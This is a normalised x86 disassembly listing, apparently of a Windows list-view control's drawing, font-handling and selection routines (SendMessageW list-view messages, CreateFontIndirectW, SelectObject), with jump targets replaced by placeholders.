cmp [ eax + 0x27c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ eax ] 0x0
lea ecx [ ebp - 0xd0 ]
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x2c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0xd0 ]
mov ecx [ ebx + 0x18 ]
dec ecx
mov eax [ ebx + 0x14 ]
call sub_4361d0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebx + 0xc ]
push eax
movzx eax [ ebp - 0x19 ]
push eax
test [ ebx + 0x10 ] 0x20
setne al
push eax
mov eax [ ebx + 0x10 ]
call sub_4aacdc
mov edx eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x12c ]
mov edx [ ebp - 0xc ]
mov [ edx + 0xc ] eax
jmp r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4ac52c
mov eax [ eax + 0x18 ]
cmp eax [ esi + 0x4 ]
jl r-xdata
jmp r-xdata
mov edx eax
and edx 0x10003
cmp edx 0x10003
jne r-xdata
xor eax eax
push ebp
push sub_4ab574
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e950
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e7e4
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x1b8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e800
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edx eax
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
mov [ ebp - 0xd ] al
mov eax [ ebp - 0x24 ]
movzx eax [ eax + 0x28 ]
push eax
push 0x0
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edx eax
mov ecx edi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x11c ]
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e7bc
retn
lea edx [ ebp - 0x3c ]
mov cl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebx + 0x18 ]
and eax 0xf000
shr eax 0xc
mov edx [ ebx + 0x14 ]
and edx 0xf000
shr edx 0xc
cmp eax edx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test [ ebx + 0x14 ] 0x2
je r-xdata
push 0x0
mov esi [ ebp - 0x8 ]
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x3cc ]
call [ esi + 0x3c8 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebx + 0x8 ]
dec edx
cmp eax edx
jle r-xdata
mov eax [ edi + 0x1c ]
inc eax
shl eax 0xc
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0xf000
or [ ebx ] 0x8
jmp r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449d80
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x14 ]
call sub_4363d8
jmp r-xdata
mov eax [ ebx + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x24 ]
sub eax 0x25
je r-xdata
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4ac52c
mov eax [ eax + 0x14 ]
cmp eax [ esi + 0x4 ]
jg r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4ac52c
mov eax [ eax + 0x18 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4ac52c
pop edx
call sub_4a71a8
jmp r-xdata
and eax 0x10004
cmp eax 0x10004
jne r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x1
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edx eax
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
mov eax [ ebp - 0x24 ]
movzx eax [ eax + 0x28 ]
push eax
push 0x1
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edx eax
mov ecx edi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x11c ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x4
call sub_448d2c
call sub_448d2c
jmp r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
lea edx [ ebp - 0x3c ]
mov cl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x3d4 ]
call [ ebx + 0x3d0 ]
jmp r-xdata
push 0x1
mov esi [ ebp - 0x8 ]
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x3cc ]
call [ esi + 0x3c8 ]
mov edx [ ebx + 0x8 ]
dec edx
mov eax edi
call sub_4a8068
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
dec ecx
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4ad5b4
mov eax [ ebp - 0x20 ]
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x19 ] 0x0
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4ac52c
mov eax [ eax + 0x14 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4ac52c
pop edx
call sub_4a71a8
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x2
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edx eax
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
movzx eax [ eax + 0x28 ]
push eax
push 0x2
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edx eax
mov ecx edi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x11c ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
xor edx edx
call sub_46e950
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4ab40e
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
xor edx edx
call sub_46e950
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2ea ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
mov eax [ eax + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
mov eax [ eax + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ ebp - 0x28 ] esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_46cf24
mov edx [ ebp - 0x28 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
mov eax [ eax + 0x14 ]
call sub_46df14
call sub_46cf24
mov edx [ ebp - 0x28 ]
mov [ edx + 0x34 ] eax
lea eax [ ebp - 0xcc ]
push eax
push 0x5c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
mov eax [ eax + 0xc ]
call sub_46d5ec
push eax
call GetObjectW
test eax eax
je r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x40
lea edx [ ebp - 0x3c ]
mov cl 0x3
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
jmp r-xdata
mov [ ebp - 0x19 ] 0x2
jmp r-xdata
dec eax
je r-xdata
push 0x3
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edx eax
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
mov eax [ ebp - 0x24 ]
movzx eax [ eax + 0x28 ]
push eax
push 0x3
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edx eax
mov ecx edi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x11c ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
xor edx edx
call sub_46e950
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x20
jmp r-xdata
mov cl 0x1
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0xcc ]
push eax
call CreateFontIndirectW
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2f8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f8 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2fc ] eax
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x2
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2f8 ] 0x0
je r-xdata
mov [ ebp - 0x19 ] 0x3
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2fc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f8 ]
push eax
call DeleteObject
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x2f8 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x2fc ] edx
sub_4ab40e
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
mov cl 0x3
mov dl 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e7bc
retn
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x40
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0xc ]
or [ eax + 0xc ] 0x40
jmp r-xdata
sub_4abbf8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
test [ ebx + 0x88 ] 0x4
je r-xdata
mov ecx [ esp ]
mov edx ebp
mov eax ebx
call sub_49635c
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x29c ]
call sub_4254d8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov eax [ esp ]
push eax
push ebp
mov edx esi
mov eax [ ebx + 0x29c ]
call sub_4a734c
call sub_4a7128
push eax
call MulDiv
push eax
mov edx esi
mov eax [ ebx + 0x29c ]
call sub_4a734c
pop edx
call sub_4a71a8
inc esi
dec edi
jne r-xdata
sub_4abc8c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x342 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x344 ]
call [ ebx + 0x340 ]
sub_4abcdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4abd35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28c ]
call sub_4a8150
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4a7bcc
mov edx esi
mov eax ebx
call sub_4a7c80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4abd3c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4abd44
push ebx
push ecx
mov [ esp ] 0x1
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x32a ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x32c ]
call [ ebx + 0x328 ]
mov cl 0x2
jmp r-xdata
sub_4abd8c
push ebx
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x322 ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
mov cl 0x2
jmp r-xdata
sub_4abdc4
push ebx
push esi
mov ebx edx
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x25 ] 0x0
jne r-xdata
cmp [ eax + 0x38a ] 0x0
je r-xdata
mov [ ebx + 0x25 ] 0x1
mov eax ebx
call sub_4a7a48
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x38c ]
call [ esi + 0x388 ]
sub_4abdfc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x3a2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3a4 ]
call [ ebx + 0x3a0 ]
sub_4abe28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4abe99
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x14 ]
call sub_449ed8
mov edx esi
mov eax ebx
call sub_4aab90
mov esi eax
cmp [ ebx + 0x39a ] 0x0
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x39c ]
call [ ebx + 0x398 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4abea0
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4a7bcc
sub_4abea8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
dec eax
jne r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x284 ]
pop ebx
retn
sub_4abec4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
cmp eax 0xf
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax [ ebx + 0x28c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp eax 0x14
jne r-xdata
mov eax ebx
call sub_48e800
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4936a0
mov eax ebx
call sub_48d12c
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_4934ac
test al al
jne r-xdata
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_4abf4a
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov ebx eax
mov eax ebx
call sub_48e874
xor eax eax
mov [ ebx + 0x2c8 ] eax
push esp
call GetCursorPos
lea ecx [ esp + 0x20 ]
mov edx esp
mov eax ebx
call sub_48dac0
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x2c4 ]
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov edx eax
mov eax [ ebx + 0x28c ]
call sub_4a81f0
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_4ac7e0
mov esi eax
mov [ ebx + 0x2c4 ] 0xffffffff
test esi esi
jne r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_496868
mov edi eax
mov eax esi
call sub_4a801c
mov ebp eax
lea eax [ esp + 0x8 ]
push eax
push ebp
push 0x1021
push edi
call SendMessageW
test eax eax
je r-xdata
mov ebx [ ebx + 0x284 ]
mov edx eax
mov eax ebx
call sub_44f4a0
lea ecx [ esp + 0x10 ]
xor edx edx
mov eax esi
call sub_4a8038
mov eax [ esp + 0x4 ]
sub eax [ esp + 0x14 ]
push eax
mov ecx [ esp + 0x4 ]
sub ecx [ esp + 0x14 ]
xor edx edx
mov eax ebx
call sub_498844
sub_4ac02c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_48e894
mov eax [ ebx + 0x284 ]
call sub_498a54
xor eax eax
mov [ ebx + 0x2c8 ] eax
pop ebx
pop ebp
retn 0x4
sub_4ac058
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_495e60
mov edi [ ebx + 0x8 ]
movzx eax [ ebx + 0x4 ]
dec al
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax esi
call sub_4ac5b8
mov [ esi + 0x2c8 ] eax
xor edx edx
mov eax esi
call sub_4ac5e0
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
jmp r-xdata
dec al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx edi
mov eax esi
call sub_48dac0
mov eax [ esp + 0x4 ]
push eax
cmp [ ebx + 0xc ] 0x0
setne al
push eax
mov edx [ edi + 0x8 ]
mov ecx [ esp + 0x8 ]
mov eax esi
call sub_4ac190
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov [ esi + 0x2c8 ] eax
cmp [ esi + 0x2a4 ] 0x0
je r-xdata
jmp r-xdata
movzx eax [ esi + 0x26d ]
sub al 0x2
jae r-xdata
mov eax esi
call sub_4ac2d8
mov ebx eax
lea ecx [ esp + 0x8 ]
xor edx edx
xor eax eax
call sub_432a5c
lea edx [ esp + 0x8 ]
mov cl 0x4
mov eax esi
call sub_4ac774
mov ebx eax
jmp r-xdata
mov eax ebx
call sub_4a801c
push eax
mov eax [ esi + 0x28c ]
call sub_4a81b8
mov edi eax
dec edi
pop eax
sub edi eax
jl r-xdata
test ebx ebx
je r-xdata
inc edi
mov ebx eax
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ esi + 0x28c ]
call sub_4a81f0
xor ecx ecx
mov edx 0x1
call sub_4a7d20
jmp r-xdata
mov edx ebx
mov eax [ esi + 0x28c ]
call sub_4a81f0
mov edx 0x1
call sub_4a7cb0
test al al
je r-xdata
sub_4ac190
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ ebp + 0xc ]
call sub_4ac7e0
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
call sub_4ac5b8
mov edi eax
cmp edi ebx
jne r-xdata
xor eax eax
mov [ esi + 0x2c8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
test edi edi
je r-xdata
cmp ebx [ esi + 0x2c8 ]
jne r-xdata
movzx ecx [ ebp + 0x8 ]
mov edx 0x1
mov eax ebx
call sub_4a7d20
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor ecx ecx
mov edx 0x1
mov eax edi
call sub_4a7d20
sub_4ac248
push ebx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_496868
mov ebx eax
mov eax sub_4a90e8
push eax
push 0x0
push 0x1030
push ebx
call SendMessageW
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_4ac280
cmp dl [ eax + 0x289 ]
je r-xdata
retn
mov [ eax + 0x289 ] dl
movzx edx [ eax + 0x289 ]
mov ecx edx
sub cl 0x1
je r-xdata
cmp [ eax + 0x34a ] 0x0
jne r-xdata
sub cl 0x2
jne r-xdata
call sub_4ac248
add dl 0xfe
sub dl 0x2
jae r-xdata
sub_4ac2bc
push ebx
push esi
mov esi edx
call sub_496868
mov ebx eax
push esi
push 0x0
push 0x1029
push ebx
call SendMessageW
pop esi
pop ebx
retn
sub_4ac2d8
push ebx
push esi
mov ebx eax
xor esi esi
movzx eax [ ebx + 0x26d ]
sub al 0x2
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_496868
push 0x0
push 0x0
push 0x1027
push eax
call SendMessageW
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x28c ]
call sub_4a81f0
mov esi eax
sub_4ac318
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x280 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x280 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x2e0 ]
call sub_44fe8c
mov ecx 0x3
xor edx edx
mov eax ebx
call sub_4a9a10
mov edx [ ebx + 0x2e0 ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x280 ]
call sub_42e354
mov eax [ ebx + 0x280 ]
call sub_44f4cc
mov edx eax
mov ecx 0x3
mov eax ebx
call sub_4a9a10
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4ac394
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x270 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x270 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x2d8 ]
call sub_44fe8c
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4a9a10
mov edx [ ebx + 0x2d8 ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x270 ]
call sub_42e354
mov eax [ ebx + 0x270 ]
call sub_44f4cc
mov edx eax
xor ecx ecx
mov eax ebx
call sub_4a9a10
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4ac408
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x278 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x278 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x2dc ]
call sub_44fe8c
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_4a9a10
mov edx [ ebx + 0x2dc ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x278 ]
call sub_42e354
mov eax [ ebx + 0x278 ]
call sub_44f4cc
mov edx eax
mov ecx 0x1
mov eax ebx
call sub_4a9a10
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4ac484
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x27c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x2e4 ]
call sub_44fe8c
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_4a9a10
cmp [ ebx + 0x2cc ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_4aa2d0
mov edx [ ebx + 0x2e4 ]
mov eax [ ebx + 0x27c ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x27c ]
call sub_42e354
mov eax [ ebx + 0x27c ]
call sub_44f4cc
mov edx eax
mov ecx 0x2
mov eax ebx
call sub_4a9a10
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
xor edx edx
mov eax ebx
call sub_4aa2d0
mov dl 0x1
mov eax ebx
call sub_4aa2d0
sub_4ac550
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test ebx ebx
je r-xdata
mov eax edi
call sub_4ac538
mov ebx eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x104 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov cl 0x1
mov edx 0x3
mov eax ebx
call sub_4a7d20
jmp r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
dec esi
jne r-xdata
xor ecx ecx
mov edx 0x3
mov eax ebx
call sub_4a7d20
movzx eax [ r-xdata ]
push eax
mov cl 0x4
mov edx ebx
mov eax edi
call sub_4ac6a0
mov ebx eax
test ebx ebx
je r-xdata
sub_4ac5b8
push ebx
mov ebx eax
movzx eax [ r-xdata ]
push eax
mov cl 0x4
xor edx edx
mov eax ebx
call sub_4ac6a0
test eax eax
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x2c8 ]
sub_4ac5e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_4ac5b8
mov esi eax
test esi esi
je r-xdata
mov cl 0x1
mov edx 0x1
mov eax esi
call sub_4a7d20
jmp r-xdata
xor ecx ecx
mov edx 0x1
mov eax esi
call sub_4a7d20
sub_4ac63c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
